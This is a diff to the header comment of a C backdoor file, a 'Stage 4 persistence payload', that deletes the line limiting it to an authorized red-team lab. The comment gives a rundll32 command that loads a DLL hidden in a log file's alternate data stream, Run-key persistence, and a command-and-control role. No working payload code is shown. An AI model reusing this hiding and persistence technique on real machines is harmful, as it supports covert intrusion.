@@ -1,7 +1,9 @@
-/* backdoor.c - TVeronica lab: Stage 4 persistence payload.
-   Authorized red team / detection-validation lab only.
+/* backdoor.c - TVeronica: Stage 4 persistence payload.
    Run via:  rundll32.exe "report.log:backdoor.dll",Start
-   (HKCU Run key set by stage3.ps1). Keeps rundll32 alive as the C2 host. */
+   (HKCU Run key set by stage3.ps1). 
+   Keeps rundll32 alive as the C2 host. 
+*/
+
 #define WIN32_LEAN_AND_MEAN
 #include <windows.h>
 #include "c2core.h"
